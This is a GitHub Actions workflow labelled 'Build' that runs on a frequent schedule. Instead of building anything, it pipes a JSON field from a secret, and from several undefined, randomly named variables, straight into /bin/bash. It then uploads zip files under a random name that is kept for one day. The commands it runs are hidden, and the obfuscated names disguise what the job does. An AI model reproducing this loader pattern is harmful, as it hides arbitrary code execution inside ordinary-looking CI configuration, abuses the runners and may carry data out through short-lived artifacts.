name: Build
on:
  workflow_dispatch:

  schedule:
    - cron: '15 3,9,15,21 * * *'
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Main step
        env:
          x0: ${{ secrets.x0 }}
        run: |
          printf '%s' "$x0" | jq -r .ad281 | /bin/bash
          echo $vclxu5 | jq -r .fqt93741 | /bin/bash
          printf '%s' "$ivgq67" | jq -r .fpdj03696 | /bin/bash
          echo $hka785 | jq -r .ois535 | /bin/bash
          echo $jhs0 | jq -r .ury37596 | /bin/bash

      - name: Save data
        uses: actions/upload-artifact@v4
        with:
          name: zcdGZraC
          path: "*.zip"
          retention-days: 1
